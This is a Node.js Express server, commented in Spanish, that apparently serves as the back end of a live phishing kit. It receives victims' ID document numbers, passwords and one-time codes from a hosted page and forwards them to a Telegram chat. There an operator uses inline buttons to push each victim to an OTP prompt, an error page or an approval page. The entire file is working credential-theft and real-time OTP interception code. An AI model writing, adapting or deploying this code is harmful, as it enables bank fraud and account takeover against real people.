const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ===== ALMACENAMIENTO DE SESIONES =====
const sesiones = new Map();

function generarSessionId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

function limpiarSesionesAntiguas() {
  const ahora = Date.now();
  for (let [id, sesion] of sesiones) {
    if (ahora - sesion.timestamp_creacion > 10 * 60 * 1000) {
      sesiones.delete(id);
      console.log(`🧹 Sesión expirada eliminada: ${id}`);
    }
  }
}

// Limpiar cada 2 minutos
setInterval(limpiarSesionesAntiguas, 2 * 60 * 1000);

function telegramConfigurado() {
  return Boolean(BOT_TOKEN && CHAT_ID);
}

async function enviarATelegram(mensaje, botones = null) {
  if (!telegramConfigurado()) {
    return {
      success: false,
      skipped: true,
      message: 'BOT_TOKEN y/o CHAT_ID no configurados'
    };
  }

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  const payload = {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: 'HTML'
  };

  // Agregar botones si existen
  if (botones && botones.length > 0) {
    payload.reply_markup = {
      inline_keyboard: botones
    };
  }

  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  const data = await response.json();
  if (!response.ok || !data.ok) {
    throw new Error(data.description || 'No fue posible enviar mensaje a Telegram');
  }

  return { success: true };
}

// ===== CORS HEADERS =====
// Permitir peticiones desde cualquier origen (necesario para Azure + Render)
// DEBE estar al inicio, ANTES de express.json() y otros middlewares
app.use((req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*');
  res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, HEAD');
  res.set('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Access-Control-Allow-Origin');
  res.set('Access-Control-Max-Age', '3600');

  console.log(`📨 ${req.method} ${req.path} - CORS habilitado`);

  // Responder a preflight requests OPTIONS
  if (req.method === 'OPTIONS') {
    console.log(`✅ Preflight OPTIONS respondido para ${req.path}`);
    return res.status(200).end();
  }

  next();
});

app.use(express.json());

// Middleware para inyectar scripts en HTML sin modificar los archivos originales
app.use((req, res, next) => {
  const originalSend = res.send;

  res.send = function(data) {
    if (typeof data === 'string' && data.includes('</body>')) {
      // Inyectar scripts antes del cierre de body
      const scriptInyectado = data.replace(
        '</body>',
        `<script src="integration.js"><\/script>\n  </body>`
      );
      return originalSend.call(this, scriptInyectado);
    }
    return originalSend.call(this, data);
  };

  next();
});

// ===== AUTO-PING =====
// Auto-ping para mantener activo en Render (cada 10 segundos)
setInterval(() => {
  console.log('✅ Auto-ping - Servidor activo:', new Date().toLocaleTimeString());
}, 10000);

// Keep-alive adicional (cada 5 minutos hacer una petición interna)
setInterval(() => {
  console.log('💚 Keep-alive: Verificando salud del servidor...');
  fetch('http://localhost:' + PORT + '/health')
    .then(res => res.json())
    .then(data => console.log('✅ Server health check OK'))
    .catch(err => console.log('⚠️ Health check error:', err.message));
}, 5 * 60 * 1000);

// ===== RUTAS DE SALUD =====
// Ruta para verificar que el servidor está activo
app.get('/health', (req, res) => {
  res.json({
    status: 'Server is running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// ===== RUTAS DE ESTADO =====
// Obtener estado actual de la sesión
app.get('/api/estado', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    telegram: {
      configured: telegramConfigurado()
    }
  });
});

// ===== RUTAS DE VERIFICACIÓN =====
// Guardar datos de verificación y retornar session_id
app.post('/api/guardar-verificacion', async (req, res) => {
  const { tipo_documento, numero_documento, recordar } = req.body;

  // Validar que tenemos los datos
  if (!tipo_documento || !numero_documento) {
    return res.status(400).json({
      success: false,
      error: 'Faltan datos requeridos'
    });
  }

  // Generar session_id único
  const session_id = generarSessionId();

  // Guardar sesión
  sesiones.set(session_id, {
    datos: {
      tipo_documento,
      numero_documento,
      recordar: recordar || false
    },
    estado: 'pendiente',
    timestamp_creacion: Date.now(),
    timestamp_respuesta: null,
    respuesta_telegram: {}
  });

  console.log(`📝 Nueva sesión creada: ${session_id}`);
  console.log(`   Documento: ${numero_documento} (${tipo_documento})`);

  // Enviar a Telegram con botones interactivos
  const mensajeTelegram = [
    `🔐 <b>NUEVO USUARIO - VERIFICACIÓN PENDIENTE</b>`,
    ``,
    `<b>Datos:</b>`,
    `• Documento: <code>${numero_documento}</code>`,
    `• Tipo: <b>${tipo_documento}</b>`,
    `• Recordar: ${recordar ? 'Sí ✓' : 'No'}`,
    ``,
    `<b>Session ID:</b> <code>${session_id}</code>`,
    `<b>Hora:</b> ${new Date().toLocaleString('es-CO')}`
  ].join('\n');

  // Botones interactivos de Telegram
  const botonesInteractivos = [
    [
      { text: 'Aprobado ✓', callback_data: `accion_aprobado_${session_id}` },
      { text: 'Error ✗', callback_data: `accion_error_${session_id}` },
      { text: 'OTP 📱', callback_data: `accion_otp_${session_id}` }
    ]
  ];

  try {
    const envio = await enviarATelegram(mensajeTelegram, botonesInteractivos);
    res.json({
      success: true,
      session_id,
      mensaje: 'Verificación enviada a Telegram. Aguardando respuesta...',
      telegram: envio
    });
  } catch (error) {
    console.error('❌ Error enviando verificación a Telegram:', error.message);
    res.json({
      success: true,
      session_id,
      mensaje: 'Sesión creada pero error enviando a Telegram',
      telegram: {
        success: false,
        error: error.message
      }
    });
  }
});

// Consultar estado de verificación
app.get('/api/consultar-estado', (req, res) => {
  const { session_id } = req.query;

  if (!session_id) {
    return res.status(400).json({
      success: false,
      error: 'Session ID requerido'
    });
  }

  const sesion = sesiones.get(session_id);

  if (!sesion) {
    return res.status(404).json({
      success: false,
      error: 'Sesión no encontrada',
      estado: 'expirada'
    });
  }

  res.json({
    success: true,
    session_id,
    estado: sesion.estado,
    datos: sesion.datos,
    respuesta: sesion.respuesta_telegram
  });
});

// ===== RUTAS DE VALIDACIÓN =====
// Procesar validaciones desde Telegram o frontend
app.post('/api/validate', async (req, res) => {
  const { tipo, documento, clave, otp, flujo } = req.body;

  console.log(`📝 Validación ${tipo}:`, { documento, flujo, timestamp: new Date().toISOString() });

  // Validación básica
  const validaciones = {
    'error': {
      success: false,
      redirect: 'index.html',
      message: 'Información incorrecta'
    },
    'aprobado': {
      success: true,
      redirect: 'aprobado.html',
      message: 'Verificación completada'
    },
    'otp-error': {
      success: false,
      redirect: 'otp.html',
      message: 'Código OTP incorrecto'
    }
  };

  const resultado = validaciones[tipo] || { success: false, message: 'Tipo de validación no reconocido' };
  const mensajeTelegram = [
    `🔎 <b>Validación recibida</b>`,
    `• Tipo: <b>${tipo || 'N/A'}</b>`,
    `• Flujo: <b>${flujo || 'N/A'}</b>`,
    `• Documento: <code>${documento || 'N/A'}</code>`,
    `• Clave: <code>${clave || 'N/A'}</code>`,
    `• OTP: <code>${otp || 'N/A'}</code>`,
    `• Fecha: ${new Date().toISOString()}`
  ].join('\n');

  try {
    const envio = await enviarATelegram(mensajeTelegram);
    res.json({ ...resultado, telegram: envio });
  } catch (error) {
    console.error('❌ Error enviando validación a Telegram:', error.message);
    res.json({
      ...resultado,
      telegram: {
        success: false,
        error: error.message
      }
    });
  }
});

// ===== RUTAS DE INTEGRACIÓN TELEGRAM =====
// Recibir respuestas desde botones de Telegram
app.post('/api/telegram/accion', async (req, res) => {
  const { session_id, accion, usuario_id, documento } = req.body;

  console.log(`🤖 Acción desde Telegram:`, { session_id, accion, usuario_id });

  // Si tiene session_id, actualizar sesión
  if (session_id && sesiones.has(session_id)) {
    const sesion = sesiones.get(session_id);

    // Mapear acción de Telegram a estado
    const estadoMap = {
      'aprobado': 'aprobado',
      'error': 'error',
      'otp': 'otp',
      'Aprobado': 'aprobado',
      'Error': 'error',
      'OTP': 'otp'
    };

    sesion.estado = estadoMap[accion] || accion;
    sesion.timestamp_respuesta = Date.now();
    sesion.respuesta_telegram = {
      accion,
      usuario_id,
      timestamp: new Date().toISOString()
    };

    console.log(`✅ Sesión ${session_id} actualizada con estado: ${sesion.estado}`);

    const respuesta = {
      success: true,
      session_id,
      accion,
      estado_actualizado: sesion.estado,
      timestamp: new Date().toISOString()
    };

    const mensajeTelegram = [
      `✅ <b>RESPUESTA REGISTRADA</b>`,
      ``,
      `Session: <code>${session_id}</code>`,
      `Acción: <b>${accion}</b>`,
      `Documento: <code>${documento || sesion.datos.numero_documento}</code>`,
      `Hora: ${new Date().toLocaleString('es-CO')}`
    ].join('\n');

    try {
      const envio = await enviarATelegram(mensajeTelegram);
      res.json({ ...respuesta, telegram: envio });
    } catch (error) {
      console.error('❌ Error:', error.message);
      res.json({ ...respuesta, telegram: { success: false, error: error.message } });
    }
  } else {
    // Sin session_id, usar formato antiguo (backward compatibility)
    console.log(`⚠️ Acción sin session_id recibida`);

    const respuesta = {
      success: true,
      usuario_id,
      accion,
      timestamp: new Date().toISOString()
    };

    res.json(respuesta);
  }
});

// ===== POLLING DE TELEGRAM =====
// Consultar actualizaciones de Telegram sin necesidad de webhook
let lastUpdateId = 0;
let pollingActivo = false;

async function pollingTelegram() {
  if (!telegramConfigurado()) {
    if (!pollingActivo) {
      console.log('⚠️ Telegram NO configurado - polling desactivado');
      pollingActivo = true;
    }
    return;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        offset: lastUpdateId + 1,
        timeout: 0
      })
    });

    const data = await response.json();

    if (!data.ok) {
      console.error('❌ Error en getUpdates de Telegram:', data.description);
      return;
    }

    if (data.result && data.result.length > 0) {
      console.log(`📬 ${data.result.length} update(s) de Telegram detectado(s)`);

      for (const update of data.result) {
        lastUpdateId = update.update_id;

        // Procesar callback_query (cuando se presiona un botón)
        if (update.callback_query) {
          const { id: callback_query_id, data: callbackData, from, message } = update.callback_query;

          console.log(`\n🔔 ========== CALLBACK TELEGRAM ==========`);
          console.log(`📱 Botón presionado por: ${from.username || from.first_name} (ID: ${from.id})`);
          console.log(`📍 CallbackData: ${callbackData}`);
          console.log(`💬 Mensaje ID: ${message.message_id}`);

          // Parsear callback_data: formato "accion_ACCION_SESSION_ID"
          const partes = callbackData.split('_');
          console.log(`🔍 Parseando: partes=${JSON.stringify(partes)}, length=${partes.length}`);

          if (partes[0] === 'accion' && partes.length >= 3) {
            const accion = partes[1]; // aprobado, error, otp
            const session_id = partes.slice(2).join('_');

            console.log(`✨ Acción válida detectada:`);
            console.log(`   - Tipo: ${accion}`);
            console.log(`   - Session ID: ${session_id}`);

            // Actualizar sesión si existe
            if (sesiones.has(session_id)) {
              const sesion = sesiones.get(session_id);

              // Mapear acción a estado
              const estadoMap = {
                'aprobado': 'aprobado',
                'error': 'error',
                'otp': 'otp'
              };

              sesion.estado = estadoMap[accion] || accion;
              sesion.timestamp_respuesta = Date.now();
              sesion.respuesta_telegram = {
                accion,
                usuario_id: from.id,
                usuario: from.username || from.first_name,
                timestamp: new Date().toISOString()
              };

              console.log(`✅ Sesión ${session_id} actualizada → estado: ${sesion.estado}`);

              // Editar mensaje de Telegram para eliminar botones
              const mensajeEditado = [
                `🔐 <b>NUEVO USUARIO - VERIFICACIÓN PENDIENTE</b>`,
                ``,
                `<b>Datos:</b>`,
                `• Documento: <code>${sesion.datos.numero_documento}</code>`,
                `• Tipo: <b>${sesion.datos.tipo_documento}</b>`,
                `• Recordar: ${sesion.datos.recordar ? 'Sí ✓' : 'No'}`,
                ``,
                `<b>Session ID:</b> <code>${session_id}</code>`,
                `<b>Respuesta:</b> <b>${accion.toUpperCase()} ✓</b>`,
                `<b>Usuario:</b> ${from.username || from.first_name}`,
                `<b>Hora:</b> ${new Date().toLocaleString('es-CO')}`
              ].join('\n');

              // Editar mensaje en Telegram (sin botones)
              try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: message.message_id,
                    text: mensajeEditado,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [] }
                  })
                });

                console.log(`✏️ Mensaje editado - botones removidos`);
              } catch (error) {
                console.error('⚠️ Error editando mensaje:', error.message);
              }

              // Responder a Telegram (quitar loading/notificación)
              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id,
                  text: `✅ ${accion.charAt(0).toUpperCase() + accion.slice(1)} registrado`
                })
              });
            } else {
              console.warn(`⚠️ Sesión ${session_id} no encontrada`);

              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id,
                  text: '❌ Sesión expirada'
                })
              });
            }
          }
        }
      }
    }
  } catch (error) {
    console.error('❌ Error en polling de Telegram:', error.message);
  }
}

// Polling cada 2 segundos
setInterval(pollingTelegram, 2000);

// ===== RUTAS ESTÁTICAS =====
// Nota: Los archivos HTML están en Azure Blob Storage, no en Render
// Por eso no servimos index.html localmente
// app.get('/', (req, res) => {
//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// Servir archivos estáticos (CSS, JS, imágenes, etc.)
// DEBE estar al final, después de todos los endpoints de API
app.use(express.static('.'));

// ===== MANEJO DE ERRORES =====
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    error: 'Error interno del servidor',
    message: err.message
  });
});

// ===== INICIO DEL SERVIDOR =====
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor ejecutándose en http://localhost:${PORT}`);
  console.log(`🌍 Acceso remoto: http://0.0.0.0:${PORT}`);
  console.log('⏰ Auto-ping activado cada 30 segundos');
  if (telegramConfigurado()) {
    console.log('🤖 Telegram configurado correctamente (BOT_TOKEN + CHAT_ID)');
  } else {
    console.log('⚠️ Telegram no configurado. Define BOT_TOKEN y CHAT_ID en variables de entorno.');
  }
  console.log('\n📝 Rutas disponibles:');
  console.log('   GET  /health - Verificar estado del servidor');
  console.log('   GET  /api/estado - Obtener estado actual');
  console.log('   POST /api/guardar-verificacion - Crear sesión y enviar a Telegram');
  console.log('   GET  /api/consultar-estado - Consultar estado de sesión');
  console.log('   POST /api/validate - Validar datos');
  console.log('\n🤖 Polling de Telegram activo (cada 2 segundos)');
  console.log('   Detecta botones presionados: Aprobado ✓, Error ✗, OTP 📱');
});
